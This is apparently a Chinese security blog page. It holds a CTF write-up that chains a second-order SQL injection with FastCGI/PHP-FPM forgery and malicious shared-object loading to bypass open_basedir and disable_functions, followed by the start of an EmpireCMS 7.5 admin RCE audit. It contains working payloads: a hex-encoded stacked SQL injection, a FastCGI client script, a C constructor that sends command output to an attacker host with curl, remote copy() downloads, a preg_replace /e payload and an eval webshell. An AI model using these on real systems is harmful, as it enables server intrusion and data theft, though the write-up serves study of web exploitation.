<p>在<code>edit.php</code>有一个很典型的二次注入，太长时间没接触一时没看出来。虽然$title在第一次入库时是经过了addslashes，但是在mysql存储的时候并不会加入<code>\</code>，导致<code>edit.php</code>页面引入之前存储的title字段产生成二次注入。<br><img src="http://static.zybuluo.com/1160307775/eiuxvnfo96iboan9shzwvql4/image_1dkakhsvmfcsqck1pkabm5dgj4t.png" alt="image_1dkakhsvmfcsqck1pkabm5dgj4t.png-405.6kB"></p>
<p>直接贴payload，注入语句用16进制代替在@SQL中了，这种绕过思路在强网杯的题目上也有用到。也可以用concat()+16进制单字符绕。</p>
<pre><code>hpdoger&#39;;SET @SQL=0x555044415445207573657273205345542069737669703d3120574845524520757365726e616d653d276870646f67657227;PREPARE pord FROM @SQL;EXECUTE pord;# 

0x555044415445207573657273205345542069737669703d3120574845524520757365726e616d653d276870646f67657227
=&gt;
UPDATE users SET isvip=1 WHERE username=&#39;hpdoger&#39;</code></pre><p>isvip==1就能代码执行了，phpinfo()看了一下，有disable_funcions和open_basedir的限制，而且过滤跟0CTF那道题很相似，但是没有安装Imagick拓展<br><img src="http://static.zybuluo.com/1160307775/7u4yy60zxzdd21m1tsqdrk2i/image_1dkakvbks1m3dlh01vaarvb17l85n.png" alt="image_1dkakvbks1m3dlh01vaarvb17l85n.png-266.2kB"></p>
<pre><code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail</code></pre><h2 id="什么是FastCGI和FPM"><a href="#什么是FastCGI和FPM" class="headerlink" title="什么是FastCGI和FPM"></a>什么是FastCGI和FPM</h2><p>举个例子，如果我们请求index.php，根据配置文件，Web Server知道这个不是静态文件，需要去找 PHP 解析器来处理，那么他会把这个请求简单处理，然后交给PHP解析器。Web Server 一般指Apache、Nginx、IIS、Lighttpd、Tomcat等服务器<br><img src="http://static.zybuluo.com/1160307775/69lriwpxmlxmybbhn5u7a0we/image_1dkah71fj1l9u4mu2gfsd2q6d9.png" alt="image_1dkah71fj1l9u4mu2gfsd2q6d9.png-61.5kB"></p>
<h3 id="CGI-amp-FastCGI"><a href="#CGI-amp-FastCGI" class="headerlink" title="CGI&amp;FastCGI"></a>CGI&amp;FastCGI</h3><p>CGI（Common Gateway Interface）全称是“通用网关接口”，WEB 服务器与PHP应用进行“交谈”的一种工具。WEB服务器会传哪些数据给PHP解析器呢？URL、查询字符串、POST数据、HTTP header都会有。所以，CGI就是规定要传哪些数据，以什么样的格式传递给后方处理这个请求的协议。</p>
<p>FastCGI是用来提高CGI程序性能的。类似于CGI，<strong>FastCGI也可以说是一种协议</strong>。简单来说就是CGI的优化：对于CGI来说，每一个Web请求PHP都必须重新解析php.ini、重新载入全部扩展，并重新初始化全部数据结构。而使用FastCGI，所有这些都只在进程启动时发生一次。还有一个额外的好处是，持续数据库连接(Persistent database connection)可以工作。</p>
<p>FastCGI的工作原理如下：<br><img src="http://static.zybuluo.com/1160307775/9a80mehqfymaajjef8zfagch/image_1dkahc1jogup1l5v1dlr9qe1c1n26.png" alt="image_1dkahc1jogup1l5v1dlr9qe1c1n26.png-88.7kB"></p>
<p>1、Web Server启动时载入FastCGI进程管理器（Apache Module或IIS ISAPI等)</p>
<p>2、FastCGI进程管理器自身初始化，启动多个CGI解释器进程(可建多个php-cgi)，并等待来自Web Server的连接。</p>
<p>3、当客户端请求到达Web Server时，FastCGI进程管理器选择并连接到一个CGI解释器。Web server将CGI环境变量和标准输入发送到FastCGI子进程php-cgi。</p>
<p>4、FastCGI子进程完成处理后，将标准输出和错误信息从同一连接返回Web Server。当FastCGI子进程关闭连接时，请求便告处理完成。FastCGI子进程接着等待，并处理来自FastCGI进程管理器(运行在Web Server中)的下一个连接。 在CGI模式中，php-cgi在此便退出了。</p>
<h3 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h3><p>FPM(php-fastcgi program manager)顾名思义，这是一个PHP专用的 fastcgi 管理器。也就是说，PHP-FPM 是对于 FastCGI 协议的具体实现，他负责管理一个进程池，来处理来自Web服务器的请求。目前，PHP5.3版本之后，PHP-FPM是内置于PHP的。因为PHP-CGI只是个CGI程序，他自己本身只能解析请求，返回结果，不会进程管理。所以就出现了一些能够调度 php-cgi 进程的程序，比如说由lighthttpd分离出来的spawn-fcgi。同样，PHP-FPM也是用于调度管理PHP解析器php-cgi的管理程序。</p>
<h2 id="open-basedir的绕过"><a href="#open-basedir的绕过" class="headerlink" title="open_basedir的绕过"></a>open_basedir的绕过</h2><p>前提是我们能够执行一段php程序来伪造FastCGI.php</p>
<p>在PHP中：</p>
<ul>
<li><p>可以通过在FastCGI协议修改PHP_VALUE字段进而修改php.ini中的一些设置，而open_basedir 同样可以通过此种方法进行设置。比如：<code>$php_value = &quot;open_basedir = /&quot;;</code></p>
</li>
<li><p>因为FPM没有判断请求的来源是否必须来自Webserver。根据PHP解析器的流程，我们可以伪造FastCGI向FPM发起请求，PHP_VALUE相当于改变.ini中的设置，覆盖了本身的open_basedir</p>
</li>
</ul>
<h3 id="FastCGI脚本"><a href="#FastCGI脚本" class="headerlink" title="FastCGI脚本"></a>FastCGI脚本</h3><pre><code>&lt;?php
class TimedOutException extends \Exception {
}
class ForbiddenException extends \Exception {
}
class Client {
const VERSION_1 = 1;
const BEGIN_REQUEST = 1;
const ABORT_REQUEST = 2;
const END_REQUEST = 3;
const PARAMS = 4;
const STDIN = 5;
const STDOUT = 6;
const STDERR = 7;
const DATA = 8;
const GET_VALUES = 9;
const GET_VALUES_RESULT = 10;
const UNKNOWN_TYPE = 11;
const MAXTYPE = self::UNKNOWN_TYPE;
const RESPONDER = 1;
const AUTHORIZER = 2;
const FILTER = 3;
const REQUEST_COMPLETE = 0;
const CANT_MPX_CONN = 1;
const OVERLOADED = 2;
const UNKNOWN_ROLE = 3;
const MAX_CONNS = &#39;MAX_CONNS&#39;;
const MAX_REQS = &#39;MAX_REQS&#39;;
const MPXS_CONNS = &#39;MPXS_CONNS&#39;;
const HEADER_LEN = 8;
const REQ_STATE_WRITTEN = 1;
const REQ_STATE_OK = 2;
const REQ_STATE_ERR = 3;
const REQ_STATE_TIMED_OUT = 4;
private $_sock = null;
private $_host = null;
private $_port = null;
private $_keepAlive = false;
private $_requests = array();
private $_persistentSocket = false;
private $_connectTimeout = 5000;
private $_readWriteTimeout = 5000;
public function __construct( $host, $port ) {
    $this-&gt;_host = $host;
    $this-&gt;_port = $port;
}
public function setKeepAlive( $b ) {
          $this-&gt;_keepAlive = (boolean) $b;
          if ( ! $this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock ) {
              fclose( $this-&gt;_sock );
    }
}
public function getKeepAlive() {
    return $this-&gt;_keepAlive;
}
public function setPersistentSocket( $b ) {
          $was_persistent          = ( $this-&gt;_sock &amp;&amp; $this-&gt;_persistentSocket );
          $this-&gt;_persistentSocket = (boolean) $b;
          if ( ! $this-&gt;_persistentSocket &amp;&amp; $was_persistent ) {
              fclose( $this-&gt;_sock );
    }
}
public function getPersistentSocket() {
    return $this-&gt;_persistentSocket;
}
public function setConnectTimeout( $timeoutMs ) {
          $this-&gt;_connectTimeout = $timeoutMs;
}
public function getConnectTimeout() {
    return $this-&gt;_connectTimeout;
}
public function setReadWriteTimeout( $timeoutMs ) {
          $this-&gt;_readWriteTimeout = $timeoutMs;
          $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout );
}
public function getReadWriteTimeout() {
    return $this-&gt;_readWriteTimeout;
}
private function set_ms_timeout( $timeoutMs ) {
          if ( ! $this-&gt;_sock ) {
        return false;
    }
    return stream_set_timeout( $this-&gt;_sock, floor( $timeoutMs / 1000 ), ( $timeoutMs % 1000 ) * 1000 );
}
private function connect() {
    if ( ! $this-&gt;_sock ) {
              if ( $this-&gt;_persistentSocket ) {
                  $this-&gt;_sock = pfsockopen( $this-&gt;_host, $this-&gt;_port, $errno, $errstr, $this-&gt;_connectTimeout / 1000 );
              } else {
                  $this-&gt;_sock = fsockopen( $this-&gt;_host, $this-&gt;_port, $errno, $errstr, $this-&gt;_connectTimeout / 1000 );
              }
              if ( ! $this-&gt;_sock ) {
                  throw new \Exception( &#39;Unable to connect to FastCGI application: &#39; . $errstr );
              }
              if ( ! $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout ) ) {
            throw new \Exception( &#39;Unable to set timeout on socket&#39; );
        }
    }
}
private function buildPacket( $type, $content, $requestId = 1 ) {
          $clen = strlen( $content );
    return chr( self::VERSION_1 )         /* version */
           . chr( $type )                    /* type */
                 . chr( ( $requestId &gt;&gt; 8 ) &amp; 0xFF ) /* requestIdB1 */
           . chr( $requestId &amp; 0xFF )        /* requestIdB0 */
                 . chr( ( $clen &gt;&gt; 8 ) &amp; 0xFF )     /* contentLengthB1 */
           . chr( $clen &amp; 0xFF )             /* contentLengthB0 */
                 . chr( 0 )                        /* paddingLength */
                 . chr( 0 )                        /* reserved */
                 . $content;                     /* content */
}
private function buildNvpair( $name, $value ) {
    $nlen = strlen( $name );
    $vlen = strlen( $value );
    if ( $nlen &lt; 128 ) {
              /* nameLengthB0 */
              $nvpair = chr( $nlen );
          } else {
              /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */
              $nvpair = chr( ( $nlen &gt;&gt; 24 ) | 0x80 ) . chr( ( $nlen &gt;&gt; 16 ) &amp; 0xFF ) . chr( ( $nlen &gt;&gt; 8 ) &amp; 0xFF ) . chr( $nlen &amp; 0xFF );
          }
          if ( $vlen &lt; 128 ) {
        /* valueLengthB0 */
        $nvpair .= chr( $vlen );
    } else {
        /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */
        $nvpair .= chr( ( $vlen &gt;&gt; 24 ) | 0x80 ) . chr( ( $vlen &gt;&gt; 16 ) &amp; 0xFF ) . chr( ( $vlen &gt;&gt; 8 ) &amp; 0xFF ) . chr( $vlen &amp; 0xFF );
    }
    /* nameData &amp; valueData */
    return $nvpair . $name . $value;
}
private function readNvpair( $data, $length = null ) {
    $array = array();
          if ( $length === null ) {
        $length = strlen( $data );
    }
    $p = 0;
          while ( $p != $length ) {
              $nlen = ord( $data{$p ++} );
              if ( $nlen &gt;= 128 ) {
                  $nlen = ( $nlen &amp; 0x7F &lt;&lt; 24 );
                  $nlen |= ( ord( $data{$p ++} ) &lt;&lt; 16 );
                  $nlen |= ( ord( $data{$p ++} ) &lt;&lt; 8 );
                  $nlen |= ( ord( $data{$p ++} ) );
              }
              $vlen = ord( $data{$p ++} );
              if ( $vlen &gt;= 128 ) {
                  $vlen = ( $nlen &amp; 0x7F &lt;&lt; 24 );
                  $vlen |= ( ord( $data{$p ++} ) &lt;&lt; 16 );
                  $vlen |= ( ord( $data{$p ++} ) &lt;&lt; 8 );
                  $vlen |= ( ord( $data{$p ++} ) );
              }
              $array[ substr( $data, $p, $nlen ) ] = substr( $data, $p + $nlen, $vlen );
              $p                                   += ( $nlen + $vlen );
    }
    return $array;
}
private function decodePacketHeader( $data ) {
          $ret                  = array();
          $ret[&#39;version&#39;]       = ord( $data{0} );
          $ret[&#39;type&#39;]          = ord( $data{1} );
          $ret[&#39;requestId&#39;]     = ( ord( $data{2} ) &lt;&lt; 8 ) + ord( $data{3} );
          $ret[&#39;contentLength&#39;] = ( ord( $data{4} ) &lt;&lt; 8 ) + ord( $data{5} );
          $ret[&#39;paddingLength&#39;] = ord( $data{6} );
          $ret[&#39;reserved&#39;]      = ord( $data{7} );
    return $ret;
}
private function readPacket() {
    if ( $packet = fread( $this-&gt;_sock, self::HEADER_LEN ) ) {
        $resp            = $this-&gt;decodePacketHeader( $packet );
              $resp[&#39;content&#39;] = &#39;&#39;;
        if ( $resp[&#39;contentLength&#39;] ) {
                  $len = $resp[&#39;contentLength&#39;];
                  while ( $len &amp;&amp; ( $buf = fread( $this-&gt;_sock, $len ) ) !== false ) {
                      $len             -= strlen( $buf );
                      $resp[&#39;content&#39;] .= $buf;
                  }
              }
              if ( $resp[&#39;paddingLength&#39;] ) {
            $buf = fread( $this-&gt;_sock, $resp[&#39;paddingLength&#39;] );
        }
        return $resp;
    } else {
        return false;
    }
}
public function getValues( array $requestedInfo ) {
          $this-&gt;connect();
          $request = &#39;&#39;;
          foreach ( $requestedInfo as $info ) {
              $request .= $this-&gt;buildNvpair( $info, &#39;&#39; );
          }
          fwrite( $this-&gt;_sock, $this-&gt;buildPacket( self::GET_VALUES, $request, 0 ) );
          $resp = $this-&gt;readPacket();
          if ( $resp[&#39;type&#39;] == self::GET_VALUES_RESULT ) {
              return $this-&gt;readNvpair( $resp[&#39;content&#39;], $resp[&#39;length&#39;] );
    } else {
        throw new \Exception( &#39;Unexpected response type, expecting GET_VALUES_RESULT&#39; );
    }
}
public function request( array $params, $stdin ) {
    $id = $this-&gt;async_request( $params, $stdin );
    return $this-&gt;wait_for_response( $id );
}
public function async_request( array $params, $stdin ) {
    $this-&gt;connect();
          // Pick random number between 1 and max 16 bit unsigned int 65535
          $id = mt_rand( 1, ( 1 &lt;&lt; 16 ) - 1 );
    // Using persistent sockets implies you want them keept alive by server!
    $keepAlive     = intval( $this-&gt;_keepAlive || $this-&gt;_persistentSocket );
          $request       = $this-&gt;buildPacket( self::BEGIN_REQUEST
              , chr( 0 ) . chr( self::RESPONDER ) . chr( $keepAlive ) . str_repeat( chr( 0 ), 5 )
        , $id
          );
          $paramsRequest = &#39;&#39;;
    foreach ( $params as $key =&gt; $value ) {
              $paramsRequest .= $this-&gt;buildNvpair( $key, $value, $id );
          }
          if ( $paramsRequest ) {
        $request .= $this-&gt;buildPacket( self::PARAMS, $paramsRequest, $id );
    }
    $request .= $this-&gt;buildPacket( self::PARAMS, &#39;&#39;, $id );
          if ( $stdin ) {
        $request .= $this-&gt;buildPacket( self::STDIN, $stdin, $id );
    }
    $request .= $this-&gt;buildPacket( self::STDIN, &#39;&#39;, $id );
          if ( fwrite( $this-&gt;_sock, $request ) === false || fflush( $this-&gt;_sock ) === false ) {
        $info = stream_get_meta_data( $this-&gt;_sock );
        if ( $info[&#39;timed_out&#39;] ) {
                  throw new TimedOutException( &#39;Write timed out&#39; );
              }
              // Broken pipe, tear down so future requests might succeed
              fclose( $this-&gt;_sock );
        throw new \Exception( &#39;Failed to write request to socket&#39; );
    }
    $this-&gt;_requests[ $id ] = array(
        &#39;state&#39;    =&gt; self::REQ_STATE_WRITTEN,
        &#39;response&#39; =&gt; null
    );
    return $id;
}
public function wait_for_response( $requestId, $timeoutMs = 0 ) {
    if ( ! isset( $this-&gt;_requests[ $requestId ] ) ) {
        throw new \Exception( &#39;Invalid request id given&#39; );
    }
    if ( $this-&gt;_requests[ $requestId ][&#39;state&#39;] == self::REQ_STATE_OK
         || $this-&gt;_requests[ $requestId ][&#39;state&#39;] == self::REQ_STATE_ERR
    ) {
        return $this-&gt;_requests[ $requestId ][&#39;response&#39;];
    }
    if ( $timeoutMs &gt; 0 ) {
              // Reset timeout on socket for now
              $this-&gt;set_ms_timeout( $timeoutMs );
          } else {
              $timeoutMs = $this-&gt;_readWriteTimeout;
    }
    $startTime = microtime( true );
          do {
              $resp = $this-&gt;readPacket();
              if ( $resp[&#39;type&#39;] == self::STDOUT || $resp[&#39;type&#39;] == self::STDERR ) {
                  if ( $resp[&#39;type&#39;] == self::STDERR ) {
                      $this-&gt;_requests[ $resp[&#39;requestId&#39;] ][&#39;state&#39;] = self::REQ_STATE_ERR;
                  }
                  $this-&gt;_requests[ $resp[&#39;requestId&#39;] ][&#39;response&#39;] .= $resp[&#39;content&#39;];
              }
              if ( $resp[&#39;type&#39;] == self::END_REQUEST ) {
                  $this-&gt;_requests[ $resp[&#39;requestId&#39;] ][&#39;state&#39;] = self::REQ_STATE_OK;
                  if ( $resp[&#39;requestId&#39;] == $requestId ) {
                      break;
                  }
              }
              if ( microtime( true ) - $startTime &gt;= ( $timeoutMs * 1000 ) ) {
                  // Reset
                  $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout );
                  throw new \Exception( &#39;Timed out&#39; );
              }
          } while ( $resp );
    if ( ! is_array( $resp ) ) {
              $info = stream_get_meta_data( $this-&gt;_sock );
              // We must reset timeout but it must be AFTER we get info
              $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout );
              if ( $info[&#39;timed_out&#39;] ) {
                  throw new TimedOutException( &#39;Read timed out&#39; );
              }
              if ( $info[&#39;unread_bytes&#39;] == 0
                   &amp;&amp; $info[&#39;blocked&#39;]
                   &amp;&amp; $info[&#39;eof&#39;] ) {
                  throw new ForbiddenException( &#39;Not in white list. Check listen.allowed_clients.&#39; );
              }
              throw new \Exception( &#39;Read failed&#39; );
          }
          // Reset timeout
          $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout );
          switch ( ord( $resp[&#39;content&#39;]{4} ) ) {
        case self::CANT_MPX_CONN:
            throw new \Exception( &#39;This app can\&#39;t multiplex [CANT_MPX_CONN]&#39; );
            break;
        case self::OVERLOADED:
            throw new \Exception( &#39;New request rejected; too busy [OVERLOADED]&#39; );
            break;
        case self::UNKNOWN_ROLE:
            throw new \Exception( &#39;Role value not known [UNKNOWN_ROLE]&#39; );
            break;
        case self::REQUEST_COMPLETE:
            return $this-&gt;_requests[ $requestId ][&#39;response&#39;];
    }
}
}
$client    = new Client(&quot;unix:///tmp/php-cgi.sock&quot;, -1);
  $php_value = &quot;open_basedir = /&quot;;
$filepath  = &#39;/tmp/readflag.php&#39;;
  $content   = &#39;hpdoger&#39;;
echo $client-&gt;request(
      array(
          &#39;GATEWAY_INTERFACE&#39; =&gt; &#39;FastCGI/1.0&#39;,
          &#39;REQUEST_METHOD&#39;    =&gt; &#39;POST&#39;,
          &#39;SCRIPT_FILENAME&#39;   =&gt; $filepath,
    &#39;SERVER_SOFTWARE&#39;   =&gt; &#39;php/fcgiclient&#39;,
    &#39;REMOTE_ADDR&#39;       =&gt; &#39;127.0.0.1&#39;,
    &#39;REMOTE_PORT&#39;       =&gt; &#39;9985&#39;,
    &#39;SERVER_ADDR&#39;       =&gt; &#39;127.0.0.1&#39;,
    &#39;SERVER_PORT&#39;       =&gt; &#39;80&#39;,
    &#39;SERVER_NAME&#39;       =&gt; &#39;mag-tured&#39;,
    &#39;SERVER_PROTOCOL&#39;   =&gt; &#39;HTTP/1.1&#39;,
    &#39;CONTENT_TYPE&#39;      =&gt; &#39;application/x-www-form-urlencoded&#39;,
    &#39;CONTENT_LENGTH&#39;    =&gt; strlen( $content ),
          &#39;PHP_VALUE&#39;         =&gt; $php_value,
),
$content
);</code></pre><h3 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h3><p>回到这个题目，首先我们找到P神有一篇文章<a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html" target="_blank" rel="noopener">PHP绕过open_basedir列目录的研究</a></p>
<p>上传一个php到/tmp下，包含之后列一下根目录存在哪些文件</p>
<pre><code>copy(&#39;http://vps/log2.txt&#39;,&#39;/tmp/scandir.php&#39;）

*lo2.txt*=&gt;
&lt;?php
$file_list = array();
// normal files
$it = new DirectoryIterator(&quot;glob:///*&quot;);
foreach($it as $f) {
    $file_list[] = $f-&gt;__toString();
}
// special files (starting with a dot(.))
$it = new DirectoryIterator(&quot;glob:///.*&quot;);
foreach($it as $f) {
    $file_list[] = $f-&gt;__toString();
}
sort($file_list);
foreach($file_list as $f){
        echo &quot;{$f}&lt;br/&gt;&quot;;
}
?&gt;</code></pre><p><img src="http://static.zybuluo.com/1160307775/ws7kk6wcaingfbutddk5mbbg/image_1dkalj2gr1c4434273c1geo1a8e64.png" alt="image_1dkalj2gr1c4434273c1geo1a8e64.png-226.6kB"></p>
<p>使用同样的copy方法上传我们的FastCGI脚本，脚本中<code>php_value</code>的值是我们的FastCGI要传给FPM的值用来修改php.ini，并且根据<code>SCRIPT_FILENAME</code>对php文件进行执行<code>/tmp/readflag.php</code>。</p>
<p>同时脚本还要修改的地方，就是使用套接字协议去加载socket。Nginx连接fastcgi的方式有2种：TCP和unix domain socket，脚本使用的即第二种形式。根据不同的php版本，找不同的fastcgi的套接字。在0CTF的题目中，大家用的是php7.2默认的FPM套接字<code>/run/php/php7.3-fpm.sock）</code>，其实FastCGI/FPM套接字都可以用，但是php5的默认</p>
<p>出题人在tmp目录已经给我们FastCGI的套接字<code>/tmp/php-cgi.sock</code>，直接修改脚本</p>
<pre><code>new Client(&quot;unix:///tmp/php-cgi.sock&quot;, -1)</code></pre><p>同时我们还要上传一个readflag.php文件作为脚本的<code>SCRIPT_FILENAME</code>，这里我让FPM为我们加载这样一个php脚本，成功读到readflag程序。但此时我们仍需要bypass disable_functions</p>
<pre><code>&lt;?php
var_dump(file_get_contents(&#39;/readflag&#39;));</code></pre><p><img src="http://static.zybuluo.com/1160307775/xvn7wtzdhnp9r0ouipcrcdbq/image_1dkaqauqt1pud86t1j5rqei74f7e.png" alt="image_1dkaqauqt1pud86t1j5rqei74f7e.png-406.1kB"></p>
<h2 id="Disable-functions的绕过"><a href="#Disable-functions的绕过" class="headerlink" title="Disable_functions的绕过"></a>Disable_functions的绕过</h2><h3 id="FastCGI加载so"><a href="#FastCGI加载so" class="headerlink" title="FastCGI加载so"></a>FastCGI加载so</h3><p>看了下Disable_functions留给我们的有putenv()</p>
<p>关于LD_PRELOAD与putenv也就不过多介绍了，飘零师傅文章写的很详细。大意就是把恶意的so文件加载到环境变量中去执行，而so是我们编译出来的c文件，包含rce的语句，这也是当时0CTF的解题思路。</p>
<p>不过在这道题中，没有安装Imagick，也没有mail函数。但是还有一个函数也会调用sendmail去开进程-&gt;error_log，后面会复现一下error_log的做法。</p>
<p>那么既然putenv()+函数是把so文件加载到环境变量中再去调用，那么我们fastcgi也完全可以做同样的事，只需要更改一下上面脚本的      <code>php_value</code>给ini添加一个extender就行了</p>
<pre><code> $php_value = &quot;allow_url_include = On\nsafe_mode = Off\nopen_basedir = /\nextension_dir = /tmp\nextension = hpdoger.so\n</code></pre><p>编译一个恶意的c文件<code>hpdoger.c</code>，这里直接用网上亘古不变的写法</p>
<pre><code>#define _GNU_SOURCE
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
__attribute__ ((__constructor__)) void preload (void)
{
    system(&quot;curl vps:6666/`/readflag`&quot;);
}</code></pre><p>通过shared命令编译<code>gcc hpdoger.c -fPIC -shared -o hpdoger.so</code>，依然是通过copy命令上传fastcgi.php和hpdoger.so，此时/tmp下应该有这两个文件</p>
<pre><code>copy(&#39;http://vps/hpdoger.so&#39;,&#39;/tmp/hpdoger.so&#39;)</code></pre><p><img src="http://static.zybuluo.com/1160307775/jov8ot2pbsbpyzpaoft92is2/image_1dkatupe71fhkrvopqi1s0a1v5nm.png" alt="image_1dkatupe71fhkrvopqi1s0a1v5nm.png-272kB"></p>
<p>直接包含fastcgi就能加载并调用hpdoger.so-&gt;bypass base_opendir-&gt;rce</p>
<pre><code>find=.*/e%00&amp;replace=include(&#39;/tmp/fastcgi.php&#39;)&amp;id=4184&amp;regex=1`</code></pre><p><img src="http://static.zybuluo.com/1160307775/i53w4nd8brbyxs76jmx8bywu/image_1dkatnc0vgq56a717rh1dff1u7s9.png" alt="image_1dkatnc0vgq56a717rh1dff1u7s9.png-78.4kB"></p>
<h3 id="LD-PRELOAD加载so"><a href="#LD-PRELOAD加载so" class="headerlink" title="LD_PRELOAD加载so"></a>LD_PRELOAD加载so</h3><p>前文提到mail被Disable_functions了，但是mail和error_log都调用了外部进程sendmail。这里编写一个php来调用error_log，然后代码执行包含这个/tmp下的php即可rce</p>
<pre><code>&lt;?php
putenv(&quot;LD_PRELOAD=/tmp/hpdoger.so&quot;);
error_log(&#39;&#39;,1);
?&gt;</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>自闭点在于本地环境和远程环境真的是两个概念，mac环境gcc编译和ubuntu的gcc编译出来的东西天壤之别..</p>

                
            </div>
            <div class="continue">
            <a href="/2019/09/17/从一道CTF学习Fastcgi绕过姿势/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2019/09/09/帝国(EmpireCMS)7.5的两个后台RCE审计/"> 
                    帝国(EmpireCMS)7.5的两个后台RCE审计 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-09-09   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="帝国-EmpireCMS-7-5的两个后台RCE审计"><a href="#帝国-EmpireCMS-7-5的两个后台RCE审计" class="headerlink" title="帝国(EmpireCMS)7.5的两个后台RCE审计"></a>帝国(EmpireCMS)7.5的两个后台RCE审计</h1><p>原文首发于先知：<a href="https://xz.aliyun.com/t/6228" target="_blank" rel="noopener">https://xz.aliyun.com/t/6228</a></p>
<h2 id="后台RCE-增加自定义页面"><a href="#后台RCE-增加自定义页面" class="headerlink" title="后台RCE-增加自定义页面"></a>后台RCE-增加自定义页面</h2><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>这个漏洞挖掘最初来源于qclover师傅:<a href="http://qclover.cn/2018/10/10/EmpireCMS_V7.5%E7%9A%84%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1.html" target="_blank" rel="noopener">EmpireCMS_V7.5的一次审计</a></p>
<p>但是在这篇复现的文章中还是有一些出入的地方，比如说getshell的具体位置和成因。这里重新跟进分析一下</p>
<p>首先看一下getshell的流程，这个洞有点像黑盒to白盒<br><img src="http://static.zybuluo.com/1160307775/2r4ccien35hlqw77mo8hrqzj/image_1dje3gco735q1k5m1f11n071a634r.png" alt="image_1dje3gco735q1k5m1f11n071a634r.png-328kB"></p>
<p>增加页面功能，会在程序根目录生成一个shell.php，访问为phpinfo结果<br><img src="http://static.zybuluo.com/1160307775/2zfoc03cbjv8woa3r5gjme49/image_1djdll0r410dk6ktm7stsgrlm.png" alt="image_1djdll0r410dk6ktm7stsgrlm.png-248.3kB"></p>
<p>但是在我写入其他木马时，例如<code>&lt;?php @eval($_REQUEST[hpdoger]);?&gt;</code>，根目录却生成了一个空的shell.php文件<br><img src="http://static.zybuluo.com/1160307775/48t49l1j0m30otcu25f646zv/image_1djdlqbum1gj217cp2d61d5f1hi613.png" alt="image_1djdlqbum1gj217cp2d61d5f1hi613.png-56.4kB"></p>
<p>此时就有些疑问，推测真正的漏洞点应该不是在根目录写入一个php，应该另有它径，这里分析一下漏洞产生的真正成因。</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>入口在<code>e/admin/ecmscom.php</code>代码48行，跟进函数<code>AddUserpage</code><br><img src="http://static.zybuluo.com/1160307775/zdc2rmjeup4qfnqr5u9agc3j/image_1djdm53uj1m201n781ncr7ednrr1g.png" alt="image_1djdm53uj1m201n781ncr7ednrr1g.png-431.1kB"></p>
<p>重点关注两个参数的流程:path、pagetext<br><img src="http://static.zybuluo.com/1160307775/w2r7bolvqfafnju4ndirh0al/image_1djdm8m8l6ve645da3es96c51t.png" alt="image_1djdm8m8l6ve645da3es96c51t.png-535.4kB"></p>
<p>步入<code>RepPhpAspJspcode</code>函数</p>
<pre><code>function RepPhpAspJspcode($string){
    global $public_r;
    if(!$public_r[candocode]){
        //$string=str_replace(&quot;&lt;?xml&quot;,&quot;[!--ecms.xml--]&quot;,$string);
        $string=str_replace(&quot;&lt;\\&quot;,&quot;&amp;lt;\\&quot;,$string);
        $string=str_replace(&quot;\\&gt;&quot;,&quot;\\&amp;gt;&quot;,$string);
        $string=str_replace(&quot;&lt;?&quot;,&quot;&amp;lt;?&quot;,$string);
        $string=str_replace(&quot;&lt;%&quot;,&quot;&amp;lt;%&quot;,$string);
        if(@stristr($string,&#39; language&#39;))
        {
            $string=preg_replace(array(&#39;!&lt;script!i&#39;,&#39;!&lt;/script&gt;!i&#39;),array(&#39;&amp;lt;script&#39;,&#39;&amp;lt;/script&amp;gt;&#39;),$string);
        }
        //$string=str_replace(&quot;[!--ecms.xml--]&quot;,&quot;&lt;?xml&quot;,$string);
    }
    return $string;
}</code></pre><p>这个函数用来对pagetext参数进行了php标签的实体化，但是empirecms默认<code>public_r[candocode]</code>为null，所以这里相当于直接返回了原始pagetext的值</p>
<p>继续回到<code>AddUserpage</code>函数，接着步入<code>ReUserpage</code>函数，在e/class/functions.php的4281行<br><img src="http://static.zybuluo.com/1160307775/gyn1d0txofybrwzm1hu39r1a/image_1djdmv7bv17551oir15kv1do5sg42a.png" alt="image_1djdmv7bv17551oir15kv1do5sg42a.png-298.8kB"></p>
<p>获取程序的根路径后拼接传入的path，而后DoFileMKDir在根目录建立了shell.php</p>
<p>接着步入<code>InfoNewsBq</code>函数，也是这个漏洞产生的函数。关键代码在<code>e/class/functions.php</code>的2469-2496行</p>
